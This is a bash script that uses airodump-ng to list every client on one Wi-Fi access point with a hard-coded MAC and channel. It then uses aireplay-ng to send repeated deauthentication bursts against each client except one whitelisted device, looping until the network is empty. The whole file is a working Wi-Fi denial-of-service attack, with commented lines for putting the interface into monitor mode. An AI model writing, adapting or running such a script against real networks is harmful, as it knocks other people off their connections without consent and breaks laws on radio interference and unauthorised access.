pass="50:3E:AA:E3:3A:66"
ap="D8:9D:67:4D:EC:30"
channel="11"
interface="wlan0"
filename="rst-01.csv"
cooldown=15

rm resultat

declare -a target_list

scan ()
{
    target_count=0
    yes | rm rst*
    sudo airodump-ng -d $ap -c $channel -w rst --output-format csv "${interface}mon" & 
    # sudo airodump-ng -d D8:9D:67:4D:EC:30 -c 11 -w rst wlan0mon &
    sleep $1
    sudo killall airodump-ng


    while read line
    do
        for word in $line
        do
            if [[ $word =~ ..\:..\:..\:..\:..\:..\,$ ]]
            then
                word=$( echo $word | sed 's/,//' )
                echo ">>>dis ${word}" >> resultat
                if [[ $word == $pass ]] || [[ $word == $ap ]]
                then
                    echo "${word} : long time no see" >> resultat
                else
                    echo "${word} : gotcha" >> resultat
                    target_list[$target_count]=$word
                    target_count=$(( target_count + 1 ))
                fi                
            fi
        done
    done < $filename

    # yes | rm rst*
    clear
}

deauth ()
{
    d_client="$1"
    duration="$2"
    end=$((SECONDS+duration))
    echo $end
    while [ $SECONDS -lt $end ]
    do
        sudo aireplay-ng -0 16 -a $ap -c $d_client ${interface}mon
    done
}

clean_slate ()
{
    target_list=("init")
    while [ ${#target_list[@]} -ne 0 ]
    do
        target_list=()
        scan 25
        echo ${target_list[@]}
        for target in "${target_list[@]}"
        do
            echo "deauth : ${target}" >> resultat
            deauth $target 15
        done
    done
}

# echo "check kill"
# sudo airmon-ng check kill
# echo "check kill ok"
# echo "start"
# sudo airmon-ng start $interface
# echo "start ok"
# echo "airodump"
# sudo airodump-ng -d $ap -c $channel -w rst "${interface}mon" &
# echo "airodump ok"



clean_slate